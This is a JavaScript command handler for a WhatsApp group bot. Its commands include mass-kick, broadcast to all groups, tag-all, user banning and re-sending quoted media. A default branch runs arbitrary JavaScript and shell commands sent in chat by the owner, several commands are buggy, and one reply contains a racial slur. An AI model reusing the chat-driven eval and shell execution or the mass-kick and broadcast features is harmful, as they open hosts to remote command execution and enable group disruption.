 case 'join': {
 if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
 if (!isCreator) return reply("owner only.");
if (!text) return reply(`example ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Void.groupAcceptInvite(result)
await reply(`Done`)
}
break;
case 'tag':
case 'totag': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('*admins only')
if (!isBotAdmins) return reply('_Bot must be admin first_')
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               Void.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
break;

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
if (/webp/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
let media = await Void.downloadAndSaveMediaMessage(m)
await Void.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break;
case 'checkidch': case 'idch': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!text) return reply("example : idch - link of channel")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link is not valid bro ")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Void.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Follower:* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return reply(teks)
}
break;
//========================================================\\
 case 'tagme': {
     if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
     if (!isCreator) return m.reply('owner only')
     if (!m.isGroup) throw mess.group
     let menst = [m.sender];
     Void.sendMessage(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
break;
case 'hd':
  case 'remini':{
  if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photo With caption ${prefix + command}`)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			Void.sendMessage(m.chat, { image: proses, caption: `_Success in Making ${command}_`}, { quoted: m})
			} catch {
			  reply('erro bro')
			}
			}

       break;
       
       case "kickall":
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, Void.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (!kickedUser.length >= 1) 
     return m.reply("In this group there are no members except you and me"); 
   const res = await Void.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await m.reply( 
     `sucessfully kicked member\n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
break;
case 'toimg': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replynano(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Void.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Void.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
  break;
  
    case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
            if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
                if (!isCreator) return reply("owner only");
                if (!quoted) return reply(`Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Reply Image With Caption ${prefix + command}`)
                var medis = await Void.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Void.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(m.done)
                } else {
                    var memeg = await Void.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(m.done)
                }
break;
case "device":
case "getdevice": {
	 if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
  if (!m.quoted) {
    return m.reply('*Please quote a message to use this command!*');
  }

  try {
    // Get the quoted message
    const quotedMsg = await m.getQuotedMessage();

    if (!quotedMsg) {
      return m.reply('*Could not detect, please try with newly sent message!*');
    }

    const messageId = quotedMsg.key.id;

    // Determine the device using the getDevice function from Baileys
    const device = getDevice(messageId) || 'Unknown';

    m.reply(`The message is sent from *${device}* device.`);
  } catch (err) {
    m.reply('Error determining device: ' + err.message);
  }
}
break;
case "autoreact": {
            if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');                 
 if (!isCreator) return m.reply("Owner only.");
    // Parse command for 'on' or 'off'
    const args = text.trim().split(' ')[0];
    if (!args || !["on", "off"].includes(args)) {
        return reply(' use: *autoreact on* or *autoreact off*');
    }

    if (!global.autoReact) global.autoReact = {};

    // Set auto-react status based on command
    if (args === "on") {
        global.autoReact[m.chat] = true;
        return reply('*auto react command launched successfully enjoy 💨*');
    } else if (args === "off") {
        global.autoReact[m.chat] = false;
        return reply('*auto react command off 💨*');
    }
}
break;
case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
        if (!q) return reply(`reply to an image with your desired text `)
        let getGroups = await Void.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(` Posting in ${xeoncast.length} Group chat, deep ${xeoncast.length * 1,5} second`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await Void.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Void.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`The results are broadcast in the group ${xeoncast.length}`)      
break;
case 'listonline': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
        if (!m.isGroup) return reply(mess.grouponly);
        Void.sendMessage(from, { react: { text: "💨", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        Void.sendText(m.chat, ' 「Online Members」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
break;
case 'tovn': {
  if (!quoted) return reply('Reply to a video or voice message to convert to audio.');
  if (!/video|audio/.test(mime)) return reply('Media type not supported. Please reply to a video or voice note.');

  try {
    let media = await quoted.download();
    await Void.sendMessage(m.chat, {
      audio: media,
      mimetype: 'audio/mpeg',
      ptt: false
    }, { quoted: m });
  } catch (e) {
    reply('Failed to convert media to audio.');
  }
}
break;
case 'qc': {
  if (!text) return m.reply('Use format: *.qc your quote*');

  const name = m.pushName || 'User';
  const quote = text.trim();

  let profilePic;
  try {
    profilePic = await Void.profilePictureUrl(m.sender, 'image');
  } catch {
    profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg'; // fallback
  }

  const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

  try {
    await Void.sendImageAsSticker(m.chat, url, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Quote card sticker generation error:', err);
    m.reply('Oops! Failed to create your quote sticker.');
  }
}
break;
case 'ai': {
  if (!text) return m.reply('Example: .ai who are you?');

  await Void.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: text,
      temperature: 0.5
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "RadiationMD WhatsApp Bot"
      }
    });

    await Void.sendMessage(m.chat, {
      text: `╭─❍ *AI Assistant*\n│\n│ *Q:* ${text}\n│\n│ *A:*\n│ ${data}\n│\n╰─✅ _Wanna ask smth?_`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`AI encountered a problem: ${e.message}`);
  }
}
break;
case 'radiateai': {
  if (!text) return m.reply('Example: .radiateai whats cookin?');

  await Void.sendPresenceUpdate('composing', m.chat);

  try {
    const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: prompt,
      temperature: 0.6
    }, {
      headers: {
        "Accept": "*/*",
        "User-Agent": "Radiation WhatsApp Bot"
      }
    });

    await Void.sendMessage(m.chat, {
      text: `╭─❍ *Radiate AI*\n│\n│ *Question:* ${text}\n│\n│ *Answer:*\n│ ${data}\n│\n╰─ _With kindness, your assistant!_`
    }, { quoted: m });

  } catch (e) {
    await m.reply(`radiation had an error: ${e.message}`);
  }
}
break;
case 'unblock': case 'unblocked': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
	 if (!isCreator) return m.reply("Owner only.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Void.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break;
	case 'block': case 'blocked': {
	if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
	 if (!isCreator) return m.reply("Owner only.");
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Void.updateBlockStatus(users, 'block')
		await reply(`Done`)
			}
	break;
case 'creategc': case 'creategroup': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
 if (!isCreator) return m.reply("Owner only.");
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await Void.groupCreate(args.join(" "), [])
let response = await Void.groupInviteCode(cret.id)
teks = ` 「 Create Group 」
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
  `
Void.sendMessage(m.chat, { text:teks, mentions: await Void.parseMention(teks)}, {quoted:m})
} catch {
reply("done!")
}
}
break;
case 'brat': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
            if (!q) return reply(`Send command with text. ${prefix + command} Void`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, Void, m);
        }
       break;
  case 'furbrat': {
  if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
            if (!q) return reply(`Send command with text. ${prefix + command} Void`)
            const imageUrl = `https://fastrestapis.fasturl.link/tool/furbrat?text=${q}`
            await makeStickerFromUrl(imageUrl, Void, m);
        }
       break;
case 'tourl': {    
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return m.reply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('../system/Data6');
    const uploadFile = require('../system/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    Void.sendMessage(m.chat, {
        text: `[\`\`\`HERE IS THE URL BY ☩ Equalizer ☩-ᴍᴅ]\`\`\` \n*© 𝐕𝐎𝐈𝐃 ᴛᴇᴄʜ ɪɴᴄ* \n ${link}`
    }, { quoted: m });
}
break;
case 'vv': {
if (!isCreator) return m.reply("Owner only.");
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!m.quoted) return reply('Please reply to an image, video, or voice note.');

    try {
        // Download the quoted media
        const mediaBuffer = await Void.downloadMediaMessage(m.quoted);

        if (!mediaBuffer) {  
            return reply('⚠️ Failed to download media. Try again.\n_ʙʏ ☩ Equalizer ☩ ᴍᴅ_');  
        }  

        // Determine the media type  
        const mediaType = m.quoted.mtype;  

        if (mediaType === 'imageMessage') {  
            await Void.sendMessage(m.chat, {   
                image: mediaBuffer,   
                caption: "💨_ʜᴇʀᴇs ʏᴏᴜʀ ɪᴍᴀɢᴇ\n_ʙʏ ☩ Equalizer ☩-ᴍᴅ_"   
            }, { quoted: m });
        } else if (mediaType === 'videoMessage') {  
            await Void.sendMessage(m.chat, {   
                video: mediaBuffer,   
                caption: "✅ Here's the video\n_ʙʏ ☩ Equalizer ☩-ᴍᴅ_"   
            }, { quoted: m });
        } else if (mediaType === 'audioMessage') {  
            await Void.sendMessage(m.chat, {   
                audio: mediaBuffer,   
                mimetype: 'audio/ogg', // Ensures proper voice note playback  
                ptt: true, // Sends it as a voice note  
                caption: "✅ Here's the voice note\n_ʙʏ ☩ Equalizer ☩-ᴍᴅ_"   
            }, { quoted: m });
        } else {  
            return reply('⚠️ Unsupported format. Please reply to an image, video, or voice note.\n_ʙʏ ☩ Equalizer ☩-ᴍᴅ_');  
        }
    } catch (error) {
        console.error('Error:', error);
        await replyn('⚠️ An error occurred. Try again.\nUse .save if this doesnt work\n_ʙʏ ☩ Equalizer ☩-ᴍᴅ_');
    }
}
break;
//== ban function by Void == //
case "ban": case "banuser": {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (ban.includes(orang)) return m.reply(`*User ${orang.split('@')[0]} is already banned 💨*`)
await ban.push(orang)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`\`\`\`user ${orang.split('@')[0]} banned from using the bot 💨\`\`\``)
} else {
return m.reply(example("/@tag/234XXX/reply to chat"))
}}
break;
case "unban": case "unbanuser":  {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!ban.includes(orang)) return m.reply(`\`\`\`User ${orang.split('@')[0]} not found in banlist 💨\`\`\``)
let indx = ban.indexOf(orang)
await ban.splice(indx, 1)
await fs.writeFileSync("./start/lib/banned.json", JSON.stringify(ban))
m.reply(`user  ${orang.split('@')[0]} unbanned your free to use the bot`)
} else {
return m.reply(example("@tag/234XX/reply to chat"))
}}
break
case "listban": case "listbanuser": {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("Owner only.");
if (ban.length < 1) return m.reply("no banned users yet ")
let teksnya = `here are the banned user\n`
ban.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await Void.sendMessage(m.chat, {text: teksnya, mentions: [... ban]}, {quoted: m})
}
break;
// end ban function by Void
case 'closetime': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('admin first!')
if (!isBotAdmins) return reply('_Bot must be admin first💨_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
Void.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break;

case 'opentime': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('admins only')
if (!isBotAdmins) return reply('Bot must be admin first💨 _')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
Void.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break;
            case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins) return reply('Admin only!!')
Void.groupRevokeInvite(m.chat)
}
break;
case 'everyone': 
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
 Void.sendMessage(m.chat, {
text: "everyone" + m.chat,
contextInfo: {
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'kallmetrust'
}
]
}
}
)
break;
case 'getpp':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await Void.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
Void.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break;
case "get": {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if ('!/^https?:\/\//.test(text)') return m?.reply('Prefix *URL* with http:// or https:/')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
m?.reply(`Content-Length: ${res.headers.get('content-length')}`)
}
if (!/text|json/.test(res.headers.get('content-type'))) return Void.sendMessage(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2025 LordTrust`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
m?.reply(txt.slice(0, 65536) + '')
}
}
break
case 'autobio':
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
       if (!isCreator) return m.reply("Owner only.");
                if (args.length < 1) return replyg(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
                break;
                case 'delpair':
  if (!q) return reply(`Example: ${prefix + command} 234xxx`);
  const dirPath = './lib2/pairing/';
  const folderName = fs.readdirSync(dirPath).find((file) => {
    return file.endsWith(`${q}@s.whatsapp.net`);
  });
  if (!folderName) return reply(`Folder not found: ${q}`);
  try {
    fs.rmdirSync(path.join(dirPath, folderName), { recursive: true });
    reply(`pair number deleted Successfully: ${folderName}`);
  } catch (err) {
    reply(`Error deleting paired device ${err.message}`);
  }
break;
 case 'addowner': case 'addown': {
 if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only.");
    let number = qtext.replace(/[^0-9]/g, '');
    let checkNumber = await Void.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return m.reply("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    m.reply("Owner added successfully.");
}
break;
case 'delowner': case 'delown': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only.");
    if (!args[0]) return m.reply(`Usage: ${command} 234xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    m.reply("Owner removed successfully.");
}
        break;
case 'addpremium': case 'addprem': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply(" Owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await Void.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return m.reply("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    m.reply("Success! User added to premium.");
}
break;
case 'delpremium': case 'delprem': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("owner only!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        m.reply("Success! User removed from premium.");
    } else {
        m.reply("User is not in the premium list.");
    }
}
break;
case 'public': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only.");
    Void.public = true;
    m.reply("_*☩ Equalizer ☩ ʙᴜɢ ɪs ɴᴏᴡ ᴏᴘᴇɴ ᴛᴏ ᴛʜᴇ ᴘᴜʙʟɪᴄ*_");
}
break;
case 'private': case 'self': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!isCreator) return m.reply("Owner only");
    Void.public = false;
    m.reply("_*☩ Equalizer ☩ ʙᴜɢ ɪs ɴᴏᴡ ᴏɴ ᴘʀɪᴠᴀᴛᴇ ᴍᴏᴅᴇ*_");
}
break;
case 'speedtest': case 'speed': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
let timestamp = speed()
let latensi = speed() - timestamp
         reply (`☩ Equalizer ☩ sᴘᴇᴇᴇᴅ  : ${latensi.toFixed(4)} 𝐌𝐒`); 
}
break
case 'ping': {
 if (isban) return m.reply(' YOUR BANNED FROM ACCESSING THIS  BOT NIGGA 🤡');
    const start = Date.now(); // Start time for latency calculation

    try {
        // Send initial "Pinging..." message
        let sentMessage = await Void.sendMessage(m.chat, { 
            text: 'loadin...', 
            quoted: m 
        });

        // Calculate latency
        const ping = Date.now() - start;

        // Delay for a more natural feel (1.5s)
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Edit the original message instead of sending a new one
        if (sentMessage?.key) { 
            await Void.sendMessage(m.chat, { 
                edit: sentMessage.key, 
                text: `\`Pong\`\n Latency: ${ping} *ms* ` 
            });
        }
    } catch (error) {
        console.error('❌ Error in ping command:', error);
        await Void.sendMessage(m.chat, { 
            text: `❌ *Error:* ${error.message}`, 
            quoted: m 
        });
    }
    break;
}
case 'runtime': case 'alive': { 
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
         reply(`𝚁𝙰𝙳𝙸𝙰𝚃𝙸𝙾𝙽 𝙸𝚂 𝙰𝙲𝚃𝙸𝚅𝙴 \n 𝚂𝙿𝙴𝙴𝙳\n : ${runtime(process.uptime())} `); 
}
break

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})